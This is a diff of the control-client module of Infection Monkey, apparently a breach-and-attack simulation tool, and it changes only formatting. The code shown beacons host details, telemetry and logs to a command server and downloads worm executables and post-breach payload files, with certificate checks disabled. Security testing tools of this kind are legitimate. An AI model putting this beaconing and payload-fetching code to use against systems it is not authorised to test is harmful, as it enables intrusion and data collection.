@@ -23,7 +23,6 @@ from infection_monkey.utils.exceptions.planned_shutdown_exception import Planned
 
 __author__ = "hoffer"
 
-
 requests.packages.urllib3.disable_warnings()
 
 LOG = logging.getLogger(__name__)
@@ -32,7 +31,8 @@ DOWNLOAD_CHUNK = 1024
 PBA_FILE_DOWNLOAD = "https://%s/api/pba/download/%s"
 
 # random number greater than 5,
-# to prevent the monkey from just waiting forever to try and connect to an island before going elsewhere.
+# to prevent the monkey from just waiting forever to try and connect to an island before going
+# elsewhere.
 TIMEOUT_IN_SECONDS = 15
 
 
@@ -52,32 +52,32 @@ class ControlClient(object):
             has_internet_access = check_internet_access(WormConfiguration.internet_services)
 
         monkey = {
-            "guid": GUID,
-            "hostname": hostname,
-            "ip_addresses": local_ips(),
-            "description": " ".join(platform.uname()),
-            "internet_access": has_internet_access,
-            "config": WormConfiguration.as_dict(),
-            "parent": parent,
+            "guid":GUID,
+            "hostname":hostname,
+            "ip_addresses":local_ips(),
+            "description":" ".join(platform.uname()),
+            "internet_access":has_internet_access,
+            "config":WormConfiguration.as_dict(),
+            "parent":parent,
         }
 
         if ControlClient.proxies:
             monkey["tunnel"] = ControlClient.proxies.get("https")
 
         requests.post(
-            "https://%s/api/monkey" % (WormConfiguration.current_server,),  # noqa: DUO123
-            data=json.dumps(monkey),
-            headers={"content-type": "application/json"},
-            verify=False,
-            proxies=ControlClient.proxies,
-            timeout=20,
+                "https://%s/api/monkey" % (WormConfiguration.current_server,),  # noqa: DUO123
+                data=json.dumps(monkey),
+                headers={"content-type":"application/json"},
+                verify=False,
+                proxies=ControlClient.proxies,
+                timeout=20,
         )
 
     @staticmethod
     def find_server(default_tunnel=None):
         LOG.debug(
-            "Trying to wake up with Monkey Island servers list: %r"
-            % WormConfiguration.command_servers
+                "Trying to wake up with Monkey Island servers list: %r"
+                % WormConfiguration.command_servers
         )
         if default_tunnel:
             LOG.debug("default_tunnel: %s" % (default_tunnel,))
@@ -93,10 +93,10 @@ class ControlClient(object):
                     debug_message += " through proxies: %s" % ControlClient.proxies
                 LOG.debug(debug_message)
                 requests.get(
-                    f"https://{server}/api?action=is-up",  # noqa: DUO123
-                    verify=False,
-                    proxies=ControlClient.proxies,
-                    timeout=TIMEOUT_IN_SECONDS,
+                        f"https://{server}/api?action=is-up",  # noqa: DUO123
+                        verify=False,
+                        proxies=ControlClient.proxies,
+                        timeout=TIMEOUT_IN_SECONDS,
                 )
                 WormConfiguration.current_server = current_server
                 break
@@ -131,17 +131,18 @@ class ControlClient(object):
             if ControlClient.proxies:
                 monkey["tunnel"] = ControlClient.proxies.get("https")
             requests.patch(
-                "https://%s/api/monkey/%s"
-                % (WormConfiguration.current_server, GUID),  # noqa: DUO123
-                data=json.dumps(monkey),
-                headers={"content-type": "application/json"},
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    "https://%s/api/monkey/%s"
+                    % (WormConfiguration.current_server, GUID),  # noqa: DUO123
+                    data=json.dumps(monkey),
+                    headers={"content-type":"application/json"},
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
             return {}
 
@@ -149,23 +150,25 @@ class ControlClient(object):
     def send_telemetry(telem_category, json_data: str):
         if not WormConfiguration.current_server:
             LOG.error(
-                "Trying to send %s telemetry before current server is established, aborting."
-                % telem_category
+                    "Trying to send %s telemetry before current server is established, aborting."
+                    % telem_category
             )
             return
         try:
-            telemetry = {"monkey_guid": GUID, "telem_category": telem_category, "data": json_data}
+            telemetry = {"monkey_guid":GUID, "telem_category":telem_category, "data":json_data}
             requests.post(
-                "https://%s/api/telemetry" % (WormConfiguration.current_server,),  # noqa: DUO123
-                data=json.dumps(telemetry),
-                headers={"content-type": "application/json"},
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    "https://%s/api/telemetry" % (WormConfiguration.current_server,),
+                    # noqa: DUO123
+                    data=json.dumps(telemetry),
+                    headers={"content-type":"application/json"},
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
 
     @staticmethod
@@ -173,18 +176,19 @@ class ControlClient(object):
         if not WormConfiguration.current_server:
             return
         try:
-            telemetry = {"monkey_guid": GUID, "log": json.dumps(log)}
+            telemetry = {"monkey_guid":GUID, "log":json.dumps(log)}
             requests.post(
-                "https://%s/api/log" % (WormConfiguration.current_server,),  # noqa: DUO123
-                data=json.dumps(telemetry),
-                headers={"content-type": "application/json"},
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    "https://%s/api/log" % (WormConfiguration.current_server,),  # noqa: DUO123
+                    data=json.dumps(telemetry),
+                    headers={"content-type":"application/json"},
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
 
     @staticmethod
@@ -193,32 +197,33 @@ class ControlClient(object):
             return
         try:
             reply = requests.get(
-                "https://%s/api/monkey/%s"
-                % (WormConfiguration.current_server, GUID),  # noqa: DUO123
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    "https://%s/api/monkey/%s"
+                    % (WormConfiguration.current_server, GUID),  # noqa: DUO123
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
 
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
             return
 
         try:
             unknown_variables = WormConfiguration.from_kv(reply.json().get("config"))
             LOG.info(
-                "New configuration was loaded from server: %r"
-                % (WormConfiguration.hide_sensitive_info(WormConfiguration.as_dict()),)
+                    "New configuration was loaded from server: %r"
+                    % (WormConfiguration.hide_sensitive_info(WormConfiguration.as_dict()),)
             )
         except Exception as exc:
             # we don't continue with default conf here because it might be dangerous
             LOG.error(
-                "Error parsing JSON reply from control server %s (%s): %s",
-                WormConfiguration.current_server,
-                reply._content,
-                exc,
+                    "Error parsing JSON reply from control server %s (%s): %s",
+                    WormConfiguration.current_server,
+                    reply._content,
+                    exc,
             )
             raise Exception("Couldn't load from from server's configuration, aborting. %s" % exc)
 
@@ -231,17 +236,18 @@ class ControlClient(object):
             return
         try:
             requests.patch(
-                "https://%s/api/monkey/%s"
-                % (WormConfiguration.current_server, GUID),  # noqa: DUO123
-                data=json.dumps({"config_error": True}),
-                headers={"content-type": "application/json"},
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    "https://%s/api/monkey/%s"
+                    % (WormConfiguration.current_server, GUID),  # noqa: DUO123
+                    data=json.dumps({"config_error":True}),
+                    headers={"content-type":"application/json"},
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
             return {}
 
@@ -260,7 +266,7 @@ class ControlClient(object):
     @staticmethod
     def download_monkey_exe_by_os(is_windows, is_32bit):
         filename, size = ControlClient.get_monkey_exe_filename_and_size_by_host_dict(
-            ControlClient.spoof_host_os_info(is_windows, is_32bit)
+                ControlClient.spoof_host_os_info(is_windows, is_32bit)
         )
         if filename is None:
             return None
@@ -281,7 +287,7 @@ class ControlClient(object):
             else:
                 arch = "x86_64"
 
-        return {"os": {"type": os, "machine": arch}}
+        return {"os":{"type":os, "machine":arch}}
 
     @staticmethod
     def download_monkey_exe_by_filename(filename, size):
@@ -293,11 +299,11 @@ class ControlClient(object):
                 return dest_file
             else:
                 download = requests.get(
-                    "https://%s/api/monkey/download/%s"
-                    % (WormConfiguration.current_server, filename),  # noqa: DUO123
-                    verify=False,
-                    proxies=ControlClient.proxies,
-                    timeout=MEDIUM_REQUEST_TIMEOUT,
+                        "https://%s/api/monkey/download/%s"
+                        % (WormConfiguration.current_server, filename),  # noqa: DUO123
+                        verify=False,
+                        proxies=ControlClient.proxies,
+                        timeout=MEDIUM_REQUEST_TIMEOUT,
                 )
 
                 with monkeyfs.open(dest_file, "wb") as file_obj:
@@ -310,7 +316,8 @@ class ControlClient(object):
 
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
 
     @staticmethod
@@ -323,13 +330,13 @@ class ControlClient(object):
             return None, None
         try:
             reply = requests.post(
-                "https://%s/api/monkey/download"
-                % (WormConfiguration.current_server,),  # noqa: DUO123
-                data=json.dumps(host_dict),
-                headers={"content-type": "application/json"},
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=LONG_REQUEST_TIMEOUT,
+                    "https://%s/api/monkey/download"
+                    % (WormConfiguration.current_server,),  # noqa: DUO123
+                    data=json.dumps(host_dict),
+                    headers={"content-type":"application/json"},
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=LONG_REQUEST_TIMEOUT,
             )
             if 200 == reply.status_code:
                 result_json = reply.json()
@@ -343,7 +350,8 @@ class ControlClient(object):
 
         except Exception as exc:
             LOG.warning(
-                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
+                    "Error connecting to control server %s: %s", WormConfiguration.current_server,
+                    exc
             )
 
         return None, None
@@ -371,10 +379,11 @@ class ControlClient(object):
     def get_pba_file(filename):
         try:
             return requests.get(
-                PBA_FILE_DOWNLOAD % (WormConfiguration.current_server, filename),  # noqa: DUO123
-                verify=False,
-                proxies=ControlClient.proxies,
-                timeout=LONG_REQUEST_TIMEOUT,
+                    PBA_FILE_DOWNLOAD % (WormConfiguration.current_server, filename),
+                    # noqa: DUO123
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    timeout=LONG_REQUEST_TIMEOUT,
             )
         except requests.exceptions.RequestException:
             return False
@@ -383,14 +392,14 @@ class ControlClient(object):
     def get_T1216_pba_file():
         try:
             return requests.get(
-                urljoin(
-                    f"https://{WormConfiguration.current_server}/",  # noqa: DUO123
-                    T1216_PBA_FILE_DOWNLOAD_PATH,
-                ),
-                verify=False,
-                proxies=ControlClient.proxies,
-                stream=True,
-                timeout=MEDIUM_REQUEST_TIMEOUT,
+                    urljoin(
+                            f"https://{WormConfiguration.current_server}/",  # noqa: DUO123
+                            T1216_PBA_FILE_DOWNLOAD_PATH,
+                    ),
+                    verify=False,
+                    proxies=ControlClient.proxies,
+                    stream=True,
+                    timeout=MEDIUM_REQUEST_TIMEOUT,
             )
         except requests.exceptions.RequestException:
             return False
@@ -398,21 +407,24 @@ class ControlClient(object):
     @staticmethod
     def should_monkey_run(vulnerable_port: str) -> bool:
         if (
-            vulnerable_port
-            and WormConfiguration.get_hop_distance_to_island() > 1
-            and ControlClient.can_island_see_port(vulnerable_port)
-            and WormConfiguration.started_on_island
+                vulnerable_port
+                and WormConfiguration.get_hop_distance_to_island() > 1
+                and ControlClient.can_island_see_port(vulnerable_port)
+                and WormConfiguration.started_on_island
         ):
             raise PlannedShutdownException(
-                "Monkey shouldn't run on current machine "
-                "(it will be exploited later with more depth)."
+                    "Monkey shouldn't run on current machine "
+                    "(it will be exploited later with more depth)."
             )
         return True
 
     @staticmethod
     def can_island_see_port(port):
         try:
-            url = f"https://{WormConfiguration.current_server}/api/monkey_control/check_remote_port/{port}"
+            url = (
+                f"https://{WormConfiguration.current_server}/api/monkey_control"
+                f"/check_remote_port/{port}"
+            )
             response = requests.get(url, verify=False, timeout=SHORT_REQUEST_TIMEOUT)
             response = json.loads(response.content.decode())
             return response["status"] == "port_visible"
@@ -422,8 +434,8 @@ class ControlClient(object):
     @staticmethod
     def report_start_on_island():
         requests.post(
-            f"https://{WormConfiguration.current_server}/api/monkey_control/started_on_island",
-            data=json.dumps({"started_on_island": True}),
-            verify=False,
-            timeout=MEDIUM_REQUEST_TIMEOUT,
+                f"https://{WormConfiguration.current_server}/api/monkey_control/started_on_island",
+                data=json.dumps({"started_on_island":True}),
+                verify=False,
+                timeout=MEDIUM_REQUEST_TIMEOUT,
         )
